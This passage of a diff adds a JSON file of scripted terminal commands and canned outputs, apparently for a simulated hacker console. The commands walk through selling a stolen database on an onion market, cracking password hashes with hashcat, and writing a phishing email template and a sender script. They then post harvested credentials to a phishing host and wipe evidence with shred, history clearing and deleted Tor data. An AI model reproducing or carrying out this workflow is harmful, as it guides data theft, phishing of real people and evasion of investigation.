+        "command": "proxychains curl -X POST -F \"title=Company Database for Sale\" -F \"content=SQL Dump: business_data (5.2M)\\nCustomer Data: 12M CSV\\nCracked Admin Credentials\\n\\nPrice: $500 in BTC.\\n\\nContact: darkseller@onionmail.org\" http://darkmarket.onion/new-post",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Post successfully created. ID: 9348c1"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "proxychains curl -X GET http://darkmarket.onion/post/9348c1",
+        "output": [
+            "   Title: Company Database for Sale",
+            "   Content:",
+            "   SQL Dump: business_data (5.2M)",
+            "   Customer Data: 12M CSV",
+            "   Cracked Admin Credentials",
+            "",
+            "   Price: $500 in BTC.",
+            "",
+            "   Contact: darkseller@onionmail.org",
+            "",
+            "   Replies: None"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "    echo \"darkseller@onionmail.org:securepass123\" > accounts.txt",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "gpg --gen-key",
+        "output": [
+            "   Please select what kind of key you want:",
+            "      (1) RSA and RSA (default)",
+            "      (2) DSA and Elgamal",
+            "      (3) DSA (sign only)",
+            "      (4) RSA (sign only)",
+            "   Your selection? 1",
+            "   Enter keysize (2048): 2048",
+            "   Enter the expiration date of the key: 0",
+            "   Is this correct? (y/N) y",
+            "   GPG key generated successfully."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "proxychains curl -X POST -F \"title=Encryption Available\" -F \"content=Encrypted with GPG. Key available after payment. Contact darkseller@onionmail.org.\" http://darkmarket.onion/new-post",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Post successfully created. ID: 9354c2"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "cat stolen_data/customer_data.csv",
+        "output": [
+            "   Name,Email,Phone",
+            "   John Doe,john.doe@example.com,555-1234",
+            "   Jane Smith,jane.smith@example.com,555-5678"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "cat stolen_data/business_data_dump.sql | grep 'INSERT INTO `users`'",
+        "output": [
+            "   INSERT INTO `users` VALUES (1,'admin','$2y$10$Ex4mpl3H4sh','admin@example.com');",
+            "   INSERT INTO `users` VALUES (2,'user1','$2y$10$Qx4mpl3Us3r','user1@example.com');"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+        "output": [
+            "   $2y$10$Ex4mpl3H4sh:SuperSecurePassword!",
+            "   $2y$10$Qx4mpl3Us3r:User1Password123!"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "nano phishing_template.html",
+        "output": [
+            "   File saved: phishing_template.html"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "cat phishing_template.html",
+        "output": [
+            "   <html>",
+            "   <body>",
+            "   <h1>Action Required: Verify Your Account</h1>",
+            "   <p>Dear {{name}},</p>",
+            "   <p>We’ve detected unusual activity on your account. Please verify your information by clicking the link below:</p>",
+            "   <a href=\"http://phishing-site.com/verify?email={{email}}\">Verify Account</a>",
+            "   <p>Failure to verify your account within 24 hours will result in suspension.</p>",
+            "   <p>Best regards,</p>",
+            "   <p>Support Team</p>",
+            "   </body>",
+            "   </html>"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "nano send_phishing.py",
+        "output": [
+            "   File saved: send_phishing.py"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "python3 send_phishing.py",
+        "output": [
+            "   Sending email to: John Doe (john.doe@example.com)... SUCCESS",
+            "   Sending email to: Jane Smith (jane.smith@example.com)... SUCCESS",
+            "   Sending email to: admin (admin@example.com)... SUCCESS",
+            "   Sending email to: user1 (user1@example.com)... SUCCESS"
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "proxychains curl -X POST -F 'email=john.doe@example.com' -F 'password=SuperSecurePassword!' http://phishing-site.com/verify",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Verification data logged."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "proxychains curl -X POST -F 'email=user1@example.com' -F 'password=User1Password123!' http://phishing-site.com/verify",
+        "output": [
+            "   HTTP/1.1 200 OK",
+            "   Verification data logged."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "rm phishing_template.html send_phishing.py accounts.txt stolen_data/* extracted/*",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "shred -u /var/tmp/phishing-site-logs.txt",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "history -c && history -w",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "killall tor",
+        "output": [
+            "   Tor process terminated."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "rm -rf ~/.tor",
+        "output": []
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "shutdown -h now",
+        "output": [
+            "Broadcast message from kali@attackbox (tty1) (Tue Nov 12 15:30:00 2024):",
+            "The system is going down for halt NOW!"
+        ]
+    }
+]
+    
